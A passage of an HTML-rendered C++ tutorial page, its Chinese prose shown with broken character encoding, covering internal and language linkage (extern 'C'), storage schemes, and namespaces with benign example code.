class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="comment">// å†…éƒ¨é“¾æ¥æ€§</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Internal] &quot;</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">public_helper</span><span class="params">()</span> </span>&#123; internal_print(<span class="string">&quot;Public helper called&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">public_helper</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// static void internal_print(const char*); // é”™è¯¯ï¼æ— æ³•è®¿é—®</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; public_helper(); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><h3 id="9-2-9-è¯­è¨€é“¾æ¥æ€§"><a href="#9-2-9-è¯­è¨€é“¾æ¥æ€§" class="headerlink" title="9.2.9 è¯­è¨€é“¾æ¥æ€§"></a>9.2.9 è¯­è¨€é“¾æ¥æ€§</h3><p>C++ ç¨‹åºæœ‰æ—¶éœ€è¦è°ƒç”¨ç”¨å…¶ä»–è¯­è¨€ï¼ˆä¸»è¦æ˜¯ C è¯­è¨€ï¼‰ç¼–å†™çš„å‡½æ•°ã€‚ç”±äº C++ æ”¯æŒå‡½æ•°é‡è½½ï¼ˆé€šè¿‡åç§°ä¿®é¥°ï¼‰ï¼Œè€Œ C è¯­è¨€ä¸æ”¯æŒï¼Œç›´æ¥é“¾æ¥å¯èƒ½ä¼šå¤±è´¥ã€‚<strong>è¯­è¨€é“¾æ¥æ€§ (Language Linkage)</strong> æœºåˆ¶å…è®¸æŒ‡å®šå‡½æ•°åº”éµå¾ªå“ªç§è¯­è¨€çš„é“¾æ¥çº¦å®šã€‚</p><p>æœ€å¸¸ç”¨çš„æ˜¯ <code>extern &quot;C&quot;</code>ï¼Œå®ƒæŒ‡ç¤ºç¼–è¯‘å™¨ä½¿ç”¨ C è¯­è¨€çš„é“¾æ¥çº¦å®šï¼ˆé€šå¸¸åªæ˜¯å‡½æ•°åæœ¬èº«ï¼Œæ²¡æœ‰ä¿®é¥°ï¼‰ã€‚</p><p><strong>ç”¨æ³•:</strong></p><ul><li><strong>å•ä¸ªå‡½æ•°:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">void</span> <span class="title">c_style_function</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li><strong>å¤šä¸ªå‡½æ•°å—:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; // åŒ…å« C å¤´æ–‡ä»¶</span></span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">c_function1</span><span class="params">(<span class="keyword">double</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">c_function2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>å½“åœ¨ C++ ä»£ç ä¸­åŒ…å« C è¯­è¨€çš„å¤´æ–‡ä»¶æ—¶ï¼Œè¿™äº›å¤´æ–‡ä»¶é€šå¸¸å·²ç»ä½¿ç”¨äº† <code>extern &quot;C&quot;</code>ï¼ˆé€šè¿‡æ¡ä»¶ç¼–è¯‘ <code>__cplusplus</code> å®ï¼‰æ¥ç¡®ä¿ C++ ç¼–è¯‘å™¨èƒ½æ­£ç¡®é“¾æ¥å…¶ä¸­çš„å‡½æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C å¤´æ–‡ä»¶ my_c_lib.h å¯èƒ½åŒ…å«ç±»ä¼¼ç»“æ„</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">c_api_call</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="comment">// ... å…¶ä»– C å‡½æ•°å£°æ˜ ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125; <span class="comment">// extern &quot;C&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="9-2-10-å­˜å‚¨æ–¹æ¡ˆå’ŒåŠ¨æ€åˆ†é…"><a href="#9-2-10-å­˜å‚¨æ–¹æ¡ˆå’ŒåŠ¨æ€åˆ†é…" class="headerlink" title="9.2.10 å­˜å‚¨æ–¹æ¡ˆå’ŒåŠ¨æ€åˆ†é…"></a>9.2.10 å­˜å‚¨æ–¹æ¡ˆå’ŒåŠ¨æ€åˆ†é…</h3><p>æ€»ç»“ä¸€ä¸‹ä¸»è¦çš„å­˜å‚¨æ–¹æ¡ˆï¼š</p><ol><li> <strong>è‡ªåŠ¨å­˜å‚¨:</strong> æ ˆå†…å­˜ï¼Œç”Ÿå‘½å‘¨æœŸä¸ä»£ç å—ç»‘å®šï¼Œè‡ªåŠ¨ç®¡ç†ã€‚</li><li> <strong>é™æ€å­˜å‚¨:</strong> ç¨‹åºç”Ÿå‘½å‘¨æœŸå†…å­˜åœ¨ï¼Œæ ¹æ®é“¾æ¥æ€§ï¼ˆå¤–éƒ¨ã€å†…éƒ¨ã€æ— ï¼‰å†³å®šå¯è§æ€§ã€‚</li><li> <strong>çº¿ç¨‹å­˜å‚¨:</strong> ç”Ÿå‘½å‘¨æœŸä¸çº¿ç¨‹ç»‘å®šã€‚</li><li> <strong>åŠ¨æ€å­˜å‚¨:</strong> å †å†…å­˜ï¼ˆè‡ªç”±å­˜å‚¨åŒºï¼‰ï¼Œç”Ÿå‘½å‘¨æœŸç”± <code>new</code> å’Œ <code>delete</code> æ‰‹åŠ¨ç®¡ç†ã€‚</li></ol><p>åŠ¨æ€åˆ†é… (<code>new</code>/<code>delete</code>) æä¾›äº†æœ€å¤§çš„çµæ´»æ€§ï¼Œå…è®¸åœ¨è¿è¡Œæ—¶æ ¹æ®éœ€è¦åˆ›å»ºå’Œé”€æ¯å¯¹è±¡ï¼Œä½†åŒæ—¶ä¹Ÿå¸¦æ¥äº†æ‰‹åŠ¨ç®¡ç†å†…å­˜çš„è´£ä»»ï¼Œå®¹æ˜“å‡ºé”™ï¼ˆå¦‚å†…å­˜æ³„æ¼ã€æ‚¬æŒ‚æŒ‡é’ˆï¼‰ã€‚åç»­ç« èŠ‚å°†æ›´è¯¦ç»†åœ°æ¢è®¨åŠ¨æ€å†…å­˜ç®¡ç†ï¼Œç‰¹åˆ«æ˜¯ä¸ç±»ç»“åˆä½¿ç”¨æ—¶ã€‚</p><h2 id="9-3-åç§°ç©ºé—´"><a href="#9-3-åç§°ç©ºé—´" class="headerlink" title="9.3 åç§°ç©ºé—´"></a>9.3 åç§°ç©ºé—´</h2><p>éšç€é¡¹ç›®è¶Šæ¥è¶Šå¤§ï¼Œæˆ–è€…å½“ä½ éœ€è¦ä½¿ç”¨æ¥è‡ªä¸åŒå¼€å‘è€…çš„ä»£ç åº“æ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šåç§°å†²çªã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>List</code> çš„ç±»ï¼Œè€Œå¦ä¸€ä¸ªåº“ä¹Ÿå®šä¹‰äº†ä¸€ä¸ªåŒåçš„ <code>List</code> ç±»ã€‚å½“ä½ åœ¨åŒä¸€ä¸ªç¨‹åºä¸­ä½¿ç”¨è¿™ä¸¤ä¸ªç±»æ—¶ï¼Œç¼–è¯‘å™¨å°±æ— æ³•åŒºåˆ†ä½ æŒ‡çš„æ˜¯å“ªä¸ª <code>List</code>ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒC++å¼•å…¥äº†<strong>åç§°ç©ºé—´ (Namespace)</strong> çš„æ¦‚å¿µã€‚åç§°ç©ºé—´æä¾›äº†ä¸€ç§å°†å…¨å±€ä½œç”¨åŸŸåˆ’åˆ†ä¸ºä¸åŒé€»è¾‘éƒ¨åˆ†çš„æ–¹æ³•ï¼Œæ¯ä¸ªéƒ¨åˆ†åŒ…å«ä¸€ç»„ç›¸å…³çš„åç§°ï¼ˆå¦‚å˜é‡ã€å‡½æ•°ã€ç±»ç­‰ï¼‰ã€‚</p><h3 id="9-3-1-ä¼ ç»Ÿçš„C-åç§°ç©ºé—´"><a href="#9-3-1-ä¼ ç»Ÿçš„C-åç§°ç©ºé—´" class="headerlink" title="9.3.1 ä¼ ç»Ÿçš„C++åç§°ç©ºé—´"></a>9.3.1 ä¼ ç»Ÿçš„C++åç§°ç©ºé—´</h3><p>åœ¨åç§°ç©ºé—´ç‰¹æ€§è¢«å¼•å…¥ä¹‹å‰ï¼ŒC++åªæœ‰ä¸€ä¸ª**å…¨å±€åç§°ç©ºé—´ (Global Namespace)**ã€‚æ‰€æœ‰åœ¨ä»»ä½•å‡½æ•°ã€ç±»æˆ–ç»“æ„å¤–éƒ¨å£°æ˜çš„åç§°éƒ½å±äºå…¨å±€åç§°ç©ºé—´ã€‚å¤§å‹é¡¹ç›®ä¸­ï¼Œè¿™å¾ˆå®¹æ˜“å¯¼è‡´åç§°å†²çªï¼Œç‰¹åˆ«æ˜¯å½“åŒ…å«å¤šä¸ªç¬¬ä¸‰æ–¹åº“æ—¶ã€‚</p><p>å¼€å‘è€…æœ‰æ—¶ä¼šä½¿ç”¨ä¸€äº›çº¦å®šæ¥æ¨¡æ‹Ÿåç§°ç©ºé—´ï¼Œä¾‹å¦‚ç»™æ‰€æœ‰ç›¸å…³çš„åç§°æ·»åŠ ç‰¹å®šçš„å‰ç¼€ï¼ˆå¦‚ <code>mylib_List</code>ï¼‰ï¼Œä½†è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªå®Œç¾çš„è§£å†³æ–¹æ¡ˆã€‚</p><h3 id="9-3-2-æ–°çš„åç§°ç©ºé—´ç‰¹æ€§"><a href="#9-3-2-æ–°çš„åç§°ç©ºé—´ç‰¹æ€§" class="headerlink" title="9.3.2 æ–°çš„åç§°ç©ºé—´ç‰¹æ€§"></a>9.3.2 æ–°çš„åç§°ç©ºé—´ç‰¹æ€§</h3><p>C++æ ‡å‡†å¼•å…¥äº† <code>namespace</code> å…³é”®å­—æ¥æ˜¾å¼åœ°åˆ›å»ºå…·åçš„åç§°ç©ºé—´ã€‚</p><p><strong>å®šä¹‰åç§°ç©ºé—´:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="comment">// åœ¨è¿™é‡Œå£°æ˜å’Œå®šä¹‰å˜é‡ã€å‡½æ•°ã€ç±»ç­‰</span></span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="comment">// namespace mycode</span></span><br></pre></td></tr></table></figure><p><strong>è®¿é—®åç§°ç©ºé—´æˆå‘˜:</strong></p><p>æœ‰ä¸‰ç§ä¸»è¦æ–¹æ³•å¯ä»¥è®¿é—®åç§°ç©ºé—´ä¸­çš„æˆå‘˜ï¼š</p><ol><li><p><strong>ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ <code>::</code> (Scope Resolution Operator):</strong> ä½¿ç”¨åç§°ç©ºé—´åç§°å’Œ <code>::</code> æ¥é™å®šæˆå‘˜åã€‚è¿™æ˜¯æœ€å®‰å…¨çš„æ–¹å¼ï¼Œå› ä¸ºå®ƒæ˜ç¡®æŒ‡å‡ºäº†ä½¿ç”¨çš„æ˜¯å“ªä¸ªåç§°ç©ºé—´çš„æˆå‘˜ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; mycode::value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>using</code> å£°æ˜ (Using Declaration):</strong> ä½¿ç‰¹å®šçš„åç§°ç©ºé—´æˆå‘˜å¯ç”¨ï¼Œå°±åƒå®ƒæ˜¯åœ¨å½“å‰ä½œç”¨åŸŸå£°æ˜çš„ä¸€æ ·ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> score = <span class="number">9.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> mycode::value; <span class="comment">// åªè®© value å¯ç”¨</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// è¾“å‡º 10 (ç›´æ¥è®¿é—®)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; score &lt;&lt; std::endl; // é”™è¯¯ï¼score æœªå£°æ˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; mycode::score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// éœ€è¦é™å®šç¬¦</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>using</code> æŒ‡ä»¤ (Using Directive):</strong> ä½¿æ•´ä¸ªåç§°ç©ºé—´çš„æ‰€æœ‰æˆå‘˜éƒ½å¯ç”¨ã€‚è¿™æ¯”è¾ƒæ–¹ä¾¿ï¼Œä½†ä¹Ÿå¯èƒ½é‡æ–°å¼•å…¥åç§°å†²çªçš„é—®é¢˜ï¼Œåº”è°¨æ…ä½¿ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨å¤´æ–‡ä»¶ä¸­ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> score = <span class="number">9.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ using æŒ‡ä»¤ä½¿ mycode çš„æ‰€æœ‰æˆå‘˜å¯ç”¨</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> mycode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 10 (ç›´æ¥è®¿é—®)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 9.5 (ç›´æ¥è®¿é—®)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong><code>std</code> åç§°ç©ºé—´:</strong></p><p>C++æ ‡å‡†åº“çš„æ‰€æœ‰ç»„ä»¶ï¼ˆå¦‚ <code>cout</code>, <code>cin</code>, <code>string</code>, <code>vector</code> ç­‰ï¼‰éƒ½è¢«å®šä¹‰åœ¨ <code>std</code> åç§°ç©ºé—´ä¸­ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬é€šå¸¸éœ€è¦å†™ <code>std::cout</code> æˆ–è€…åœ¨æ–‡ä»¶å¼€å¤´ä½¿ç”¨ <code>using namespace std;</code> æˆ– <code>using std::cout;</code>ã€‚</p><p><strong>æœªå‘½åçš„åç§°ç©ºé—´ (Unnamed Namespaces):</strong></p><p>ä½ ä¹Ÿå¯ä»¥åˆ›å»ºæœªå‘½åçš„åç§°ç©ºé—´ã€‚è¿™ç±»ä¼¼äºä½¿ç”¨ <code>static</code> å…³é”®å­—å£°æ˜å…·æœ‰å†…éƒ¨é“¾æ¥æ€§çš„å…¨å±€å˜é‡æˆ–å‡½æ•°ã€‚æœªå‘½ååç§°ç©ºé—´ä¸­çš„æˆå‘˜åªèƒ½åœ¨å½“å‰æ–‡ä»¶å†…è®¿é—®ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="comment">// è¿™äº›æˆå‘˜åªåœ¨å½“å‰æ–‡ä»¶å¯è§</span></span><br><span class="line">    <span class="keyword">int</span> internal_count = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">increment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        internal_count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨åŒä¸€æ–‡ä»¶ä¸­å¯ä»¥è®¿é—®</span></span><br><span class="line"><span class="comment">// increment();</span></span><br><span class="line"><span class="comment">// std::cout &lt;&lt; internal_count &lt;&lt; std::endl;</span></span><br></pre></td></tr></table></figure><h3 id="9-3-3-åç§°ç©ºé—´ç¤ºä¾‹"><a href="#9-3-3-åç§°ç©ºé—´ç¤ºä¾‹" class="headerlink" title="9.3.3 åç§°ç©ºé—´ç¤ºä¾‹"></a>9.3.3 åç§°ç©ºé—´ç¤ºä¾‹</h3><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ›´å®Œæ•´çš„ç¤ºä¾‹ï¼Œå±•ç¤ºäº†å¦‚ä½•å®šä¹‰å’Œä½¿ç”¨å¤šä¸ªåç§°ç©ºé—´ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // std å‘½åç©ºé—´ä¸­çš„ string ç±»</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬ä¸€ä¸ªåç§°ç©ºé—´</span></span><br><span class="line"><span class="keyword">namespace</span> first_space &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside first_space&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬äºŒä¸ªåç§°ç©ºé—´</span></span><br><span class="line"><span class="keyword">namespace</span> second_space &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside second_space&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦</span></span><br><span class="line">    first_space::display();  <span class="comment">// è¾“å‡º: Inside first_space</span></span><br><span class="line">    second_space::display(); <span class="comment">// è¾“å‡º: Inside second_space</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;first_space::count = &quot;</span> &lt;&lt; first_space::count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// è¾“å‡º: 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;second_space::count = &quot;</span> &lt;&lt; second_space::count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ using å£°æ˜</span></span><br><span class="line">    &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸ</span></span><br><span class="line">        <span class="keyword">using</span> first_space::display;</span><br><span class="line">        display(); <span class="comment">// è°ƒç”¨ first_space::display()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ using æŒ‡ä»¤ (é€šå¸¸å»ºè®®åœ¨å‡½æ•°å†…éƒ¨æˆ–ç‰¹å®šä½œç”¨åŸŸå†…ä½¿ç”¨)</span></span><br><span class="line">    &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸ</span></span><br><span class="line">        <span class="keyword">using</span> <span class="keyword">namespace</span> second_space;</span><br><span class="line">        display(); <span class="comment">// è°ƒç”¨ second_space::display()</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;count from second_space = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è®¿é—® second_space::count</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// std å‘½åç©ºé—´çš„ä½¿ç”¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello from std namespace!&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-3-4-åç§°ç©ºé—´åŠå…¶å‰é€”"><a href="#9-3-4-åç§°ç©ºé—´åŠå…¶å‰é€”" class="headerlink" title="9.3.4 åç§°ç©ºé—´åŠå…¶å‰é€”"></a>9.3.4 åç§°ç©ºé—´åŠå…¶å‰é€”</h3><p>åç§°ç©ºé—´æ˜¯ç°ä»£C++ç¼–ç¨‹ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ã€‚å®ƒä»¬æ˜¯ç»„ç»‡ä»£ç ã€é¿å…åç§°å†²çªä»¥åŠç®¡ç†å¤§å‹é¡¹ç›®å¤æ‚æ€§çš„å…³é”®å·¥å…·ã€‚</p><ul><li>  <strong>åº“å¼€å‘:</strong> å‡ ä¹æ‰€æœ‰çš„ç°ä»£C++åº“éƒ½å°†å…¶ç»„ä»¶æ”¾åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªåç§°ç©ºé—´ä¸­ï¼Œä»¥é˜²æ­¢ä¸ä½¿ç”¨è¯¥åº“çš„ä»£ç æˆ–å…¶ä»–åº“å‘ç”Ÿå†²çªã€‚<code>std</code> æ˜¯æœ€å…¸å‹çš„ä¾‹å­ã€‚</li><li>  <strong>é¡¹ç›®ç»„ç»‡:</strong> åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œå¼€å‘è€…ç»å¸¸ä½¿ç”¨åç§°ç©ºé—´æ¥åˆ’åˆ†ä»£ç çš„ä¸åŒæ¨¡å—æˆ–åŠŸèƒ½åŒºåŸŸã€‚</li><li>  <strong>é¿å…å…¨å±€æ±¡æŸ“:</strong> ä½¿ç”¨åç§°ç©ºé—´å¯ä»¥å‡å°‘å…¨å±€ä½œç”¨åŸŸä¸­çš„åç§°æ•°é‡ï¼Œä½¿ä»£ç æ›´æ¸…æ™°ã€æ›´æ˜“äºç»´æŠ¤ã€‚</li></ul><p><strong>æœ€ä½³å®è·µ:</strong></p><ol><li> **ä¼˜å…ˆä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ (<code>::</code>)**ï¼šè¿™æ˜¯æœ€æ˜ç¡®ã€æœ€ä¸æ˜“å‡ºé”™çš„æ–¹å¼ã€‚</li><li> <strong>åœ¨ <code>.cpp</code> 